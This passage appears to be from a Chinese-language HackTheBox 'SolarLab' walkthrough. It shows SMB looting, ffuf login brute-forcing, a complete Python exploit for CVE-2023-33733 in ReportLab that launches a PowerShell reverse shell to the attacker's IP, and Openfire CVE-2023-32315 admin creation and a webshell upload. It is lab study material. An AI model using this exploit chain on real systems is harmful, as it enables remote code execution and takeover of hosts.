W32TIME_ALT</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到了一些文檔之後，下載到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //10.129.231.39/Documents/</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\mane]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON</span><br><span class="line">smb: \&gt; prompt OFF</span><br><span class="line">smb: \&gt; mget *</span><br><span class="line">.getting file \desktop.ini of size 278 as desktop.ini (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)</span><br><span class="line">getting file \details-file.xlsx of size 12793 as details-file.xlsx (25.3 KiloBytes/sec) (average 13.1 KiloBytes/sec)</span><br><span class="line">getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (60.2 KiloBytes/sec) (average 31.1 KiloBytes/sec)</span><br><span class="line">getting file \concepts\Training-Request-Form.docx of size 161337 as concepts/Training-Request-Form.docx (260.0 KiloBytes/sec) (average 94.7 KiloBytes/sec)</span><br><span class="line">getting file \concepts\Travel-Request-Sample.docx of size 30953 as concepts/Travel-Request-Sample.docx (57.7 KiloBytes/sec) (average 87.5 KiloBytes/sec)</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \My Music\*</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \My Pictures\*</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \My Videos\*</span><br></pre></td></tr></table></figure>
+
+<p>有一個 <code>detials-file.xlsx</code>​ 裏面存放了一些密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512032602-abz3qyw.png" alt="image">​</p>
+<p>把所有密碼保存到文件之後用ffuf進行爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: report.solarlab.htb:6791</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http://report.solarlab.htb:6791</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://report.solarlab.htb:6791/login</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=FUZZUSER&amp;password=FUZZPASS</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -request user.req -request-proto http -w <span class="string">&quot;guessUsername.txt:FUZZUSER&quot;</span> -w <span class="string">&quot;password.txt:FUZZPASS&quot;</span> -fs 2133,2144 </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\   </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/   </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\   </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : POST</span></span><br><span class="line"><span class="string"> :: URL              : http://report.solarlab.htb:6791/login</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZUSER: /home/mane/solarlab/guessUsername.txt</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZPASS: /home/mane/solarlab/password.txt</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string"> :: Header           : Connection: close</span></span><br><span class="line"><span class="string"> :: Header           : Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"> :: Header           : Origin: http://report.solarlab.htb:6791</span></span><br><span class="line"><span class="string"> :: Header           : Referer: http://report.solarlab.htb:6791/login</span></span><br><span class="line"><span class="string"> :: Header           : Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"> :: Header           : Host: report.solarlab.htb:6791</span></span><br><span class="line"><span class="string"> :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span></span><br><span class="line"><span class="string"> :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string"> :: Data             : username=FUZZUSER&amp;password=FUZZPASS</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 2133,2144</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 167ms]</span></span><br><span class="line"><span class="string">    * FUZZPASS: ThisCanB3typedeasily1@</span></span><br><span class="line"><span class="string">    * FUZZUSER: blakeb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [264/264] :: Job [1/1] :: 107 req/sec :: Duration: [0:00:02] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p>得到一個有效的用戶 <code>blakeb:ThisCanB3typedeasily1@</code>​</p>
+<h2 id="0x5-ReportHub-CVE-2023-33733"><a href="#0x5-ReportHub-CVE-2023-33733" class="headerlink" title="0x5 ReportHub - CVE-2023-33733"></a>0x5 ReportHub - CVE-2023-33733</h2><p>有了賬號密碼之後就可以登陸了。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512033025-w9b59gr.png" alt="image">​</p>
+<p>點了第一個 <code>Leave Request</code>​，隨便輸入點東西，然後就會生成一個pdf，保存到本地之後用 <code>exifrool</code>​ 看到PDF是 <code>ReportLab PDF Library</code>​ 生成的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool output.pdf </span><br><span class="line">ExifTool Version Number         : 12.65</span><br><span class="line">File Name                       : output.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.0 MB</span><br><span class="line">File Modification Date/Time     : 2024:05:12 03:31:56+08:00</span><br><span class="line">File Access Date/Time           : 2024:05:12 03:32:00+08:00</span><br><span class="line">File Inode Change Date/Time     : 2024:05:12 03:31:56+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Author                          : (anonymous)</span><br><span class="line">Create Date                     : 2024:05:11 22:31:51-02:00</span><br><span class="line">Creator                         : (unspecified)</span><br><span class="line">Modify Date                     : 2024:05:11 22:31:51-02:00</span><br><span class="line">Producer                        : ReportLab PDF Library - www.reportlab.com</span><br><span class="line">Subject                         : (unspecified)</span><br><span class="line">Title                           : (anonymous)</span><br><span class="line">Trapped                         : False</span><br><span class="line">Page Mode                       : UseNone</span><br><span class="line">Page Count                      : 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>網上搜了一下 <code>ReportLab PDF Library exploit</code>​，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512220722-mqmu8au.png" alt="image">​</p>
+<p>基本上都是  CVE-2023-33733，看到這篇：<a target="_blank" rel="noopener" href="https://github.com/c53elyas/CVE-2023-33733">https://github.com/c53elyas/CVE-2023-33733</a></p>
+<p>最後有一個POC，但是看了一下</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512220850-sulo52g.png" alt="image">​</p>
+<p>可惜它限制了300個字，根本放不下payload，使用burp發送超過300字的payload，也提示長度限制，所以沒辦法使用。</p>
+<p>接下來就需要找一個可以輸入超過300字的地方，於是點擊 <code>Travel Approval</code>​ 看到了一個好像沒有限制的輸入框。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221401-8maf9ht.png" alt="image">​</p>
+<p>然後我把它抓取到burp上，嘗試突破300字，使用burp發送payload，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221308-qfjc3cl.png" alt="image">​</p>
+<p>結果成功的收到了RCE：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512221314-8la815p.png" alt="image">​</p>
+<p>所以就做一個power reverse shell，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512045943-92mifyw.png" alt="image">​</p>
+<p>就獲得到了reverse shell，由於我的reverse shell 經常斷，所以就隨手寫了一個python payload 快速獲得reverse shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LHOST = <span class="string">&quot;10.10.16.23&quot;</span></span><br><span class="line">LPORT = <span class="string">&quot;1111&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from <span class="built_in">base64</span> import b64encode</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] POWER BY @manesec :P&quot;</span>) </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Loginning ...&quot;</span>)</span><br><span class="line">burp0_url = <span class="string">&quot;http://report.solarlab.htb:6791/login&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://report.solarlab.htb:6791&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://report.solarlab.htb:6791/login&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;BlakeB&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;ThisCanB3typedeasily1@&quot;</span>&#125;</span><br><span class="line">session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line">rev = <span class="string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;&#x27;</span>+LHOST+<span class="string">&#x27;&quot;,&#x27;</span>+LPORT+<span class="string">&#x27;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = b64encode(rev.encode(<span class="string">&#x27;UTF-16LE&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Posting payload ...&quot;</span>)</span><br><span class="line">burp0_url = <span class="string">&quot;http://report.solarlab.htb:6791/travelApprovalForm&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;.eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.Zj_keg.8KHRevG5EdVqrOsSioBX3bjvJRM&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------45558231913835190903106897165&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://report.solarlab.htb:6791&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://report.solarlab.htb:6791/travelApprovalForm&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;-----------------------------45558231913835190903106897165\r\nContent-Disposition: form-data; name=\&quot;time_interval\&quot;\r\n\r\n2024-05-05 to 2024-05-26\r\n-----------------------------45558231913835190903106897165\r\nContent-Disposition: form-data; name=\&quot;travel_request\&quot;\r\n\r\n&lt;para&gt;&lt;font color=\&quot;[[[getattr(pow, \r\nWord(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;powershell -e &quot;</span>+payload+<span class="string">&quot; &#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;\&quot;&gt;exploit&lt;/font&gt;&lt;/para&gt;\r\n-----------------------------45558231913835190903106897165\r\nContent-Disposition: form-data; name=\&quot;signature\&quot;; filename=\&quot;1.png\&quot;\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x02\x00\x00\x00\x03\x08\x02\x00\x00\x006\x88I\xd6\x00\x00\x00\x03sBIT\x08\x08\x08\xdb\xe1O\xe0\x00\x00\x00\x14IDAT\x08\x99c\xd4\xd41g‍```b``@P\x00\n\xaa\x00\x92\xf9\xcc4h\x00\x00\x00\x00IEND\xaeB`\x82\r\n-----------------------------45558231913835190903106897165\r\nContent-Disposition: form-data; name=\&quot;user_input\&quot;\r\n\r\n&lt;p&gt;power by mane&lt;/p&gt;\r\n-----------------------------45558231913835190903106897165--\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Done, Check your Netcat :P&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x6-Shell-as-blake"><a href="#0x6-Shell-as-blake" class="headerlink" title="0x6 Shell as blake"></a>0x6 Shell as blake</h2><p>得到 reverseshell，這個shell的用戶是 blake。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512045449-x8uhs67.png" alt="image">​</p>
+<p>用winpeas跑了一下，發現一些有趣的東西：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    SOLARLAB\Administrator: Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain                                                                                                       </span><br><span class="line">        |-&gt;Groups: Administrators                                                                                                                                                        </span><br><span class="line">        |-&gt;Password: CanChange-NotExpi-Req                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">    SOLARLAB\blake                                                                                                                                                                       </span><br><span class="line">        |-&gt;Groups: Users                                                                                                                                                                 </span><br><span class="line">        |-&gt;Password: CanChange-NotExpi-Req                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">    SOLARLAB\DefaultAccount(Disabled): A user account managed by the system.                                                                                                             </span><br><span class="line">        |-&gt;Groups: System Managed Accounts Group                                                                                                                                         </span><br><span class="line">        |-&gt;Password: CanChange-NotExpi-NotReq                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">    SOLARLAB\Guest: Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain                                                                                                             </span><br><span class="line">        |-&gt;Groups: Guests                                                                                                                                                                </span><br><span class="line">        |-&gt;Password: NotChange-NotExpi-NotReq                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">    SOLARLAB\openfire                                                                                                                                                                    </span><br><span class="line">        |-&gt;Groups: Users                                                                                                                                                                 </span><br><span class="line">        |-&gt;Password: CanChange-NotExpi-Req                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">    SOLARLAB\WDAGUtilityAccount(Disabled): A user account managed and used by the system <span class="keyword">for</span> Windows Defender Application Guard scenarios.                                               </span><br><span class="line">        |-&gt;Password: CanChange-Expi-Req                                                                                                                                                                                                   </span><br><span class="line">   ===================================================================================================================</span><br><span class="line">   (SOLARLAB\Administrator) Start Internal App: C:\Users\blake\Documents\start-app.bat                                                                                                  </span><br><span class="line">    Permissions file: blake [AllAccess]                                                                                                                                                  </span><br><span class="line">    Permissions folder(DLL Hijacking): blake [AllAccess]                                                                                                                                 </span><br><span class="line">    Trigger: At system startup                                                                                                                                                           </span><br><span class="line">                                          </span><br><span class="line">===================================================================================================================</span><br><span class="line">                                                                                                                                                                           </span><br><span class="line">    waitress-serve(3204)[C:\Users\blake\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\Scripts\waitress-serve.exe] -- POwn: bl</span><br><span class="line">ake                                                                                                                                                                                      </span><br><span class="line">    Possible DLL Hijacking folder: C:\Users\blake\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\Scripts (blake [AllAccess])  </span><br><span class="line">    Command Line: waitress-serve.exe  --listen 127.0.0.1:5000 --threads 10 app:app     </span><br><span class="line">  </span><br><span class="line">===================================================================================================================</span><br><span class="line"> TCP        127.0.0.1             5000          0.0.0.0               0               Listening         64              C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.</span><br><span class="line">11.1776.0_x64__qbz5n2kfra8p0\python3.11.exe                                                                                                                                              </span><br><span class="line">  TCP        127.0.0.1             5222          0.0.0.0               0               Listening         3128            openfire-service                                                </span><br><span class="line">  TCP        127.0.0.1             5223          0.0.0.0               0               Listening         3128            openfire-service                                                </span><br><span class="line">  TCP        127.0.0.1             5262          0.0.0.0               0               Listening         3128            openfire-service                                                </span><br><span class="line">  TCP        127.0.0.1             5263          0.0.0.0               0               Listening         3128            openfire-service                                                </span><br><span class="line">  TCP        127.0.0.1             5269          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             5270          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             5275          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             5276          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             7070          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             7443          0.0.0.0               0               Listening         3128     </span><br><span class="line">openfire-service</span><br><span class="line">  TCP        127.0.0.1             9090          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">  TCP        127.0.0.1             9091          0.0.0.0               0               Listening         3128            openfire-service</span><br><span class="line">===================================================================================================================</span><br><span class="line"></span><br><span class="line">File: C:\Users\blake\Documents\app\instance\users.db</span><br><span class="line"></span><br><span class="line">===================================================================================================================</span><br></pre></td></tr></table></figure>
+
+<p>發現一堆 <code>openfire</code>​ 服務在運行，所以谷歌查了一下默認管理頁面，得到openfire的web控制臺在9090，使用chisel tunnel轉發到本地，并且打開看看：</p>
+<h2 id="0x7-Openfire-CVE-2023-32315"><a href="#0x7-Openfire-CVE-2023-32315" class="headerlink" title="0x7 Openfire - CVE-2023-32315"></a>0x7 Openfire - CVE-2023-32315</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512184648-zaissza.png" alt="image">​</p>
+<p>搜了一下，看到這個版本存在 <code>CVE-2023-32315</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512184742-i8xsggb.png" alt="image">​</p>
+<p>看到這篇講得不錯：<a target="_blank" rel="noopener" href="https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce">https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce</a></p>
+<p>根據這個鏈接，打開看看，如果出現一下畫面説明有漏洞。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512054921-cxivik5.png" alt="image">​</p>
+<p>首先先獲得一個cookie，用burp截取一下，把左邊請求的cookie給刪掉，得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512185146-v4mnea2.png" alt="image">​</p>
+<p>這個時候會返回一個cookie和csrf，然後根據提示利用這個cookie和csrf 給自己創建一個管理員權限：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512185340-aanjl5f.png" alt="image">​</p>
+<p>如果返回200，説明用戶已經創建成功，然後嘗試登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512181753-uuxk8k8.png" alt="image">​</p>
+<p>得到管理員用戶。</p>
+<h2 id="0x8-Openfire-Decrypt-administrator’s-password-to-get-root"><a href="#0x8-Openfire-Decrypt-administrator’s-password-to-get-root" class="headerlink" title="0x8 Openfire - Decrypt administrator’s password to get root"></a>0x8 Openfire - Decrypt administrator’s password to get root</h2><p>因爲有管理員權限，就可以上傳一個 <code>openfire-management-tool-plugin</code>​ (實際上和webshell差不多)：<a target="_blank" rel="noopener" href="https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar">https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512181823-jwn1uyi.png" alt="image">​</p>
+<p>​<code>Server</code>​ -&gt; <code>Server Settings</code>​ -&gt; <code>Management Tool</code>​ ，密碼輸入 123</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-6XEE0TRMx0wXasWu-SolarLab/image-20240512182014-8rmon4p.png" alt="image">​</p>
+<p>然後得到一個webshell看看裏面有什麽：</p>
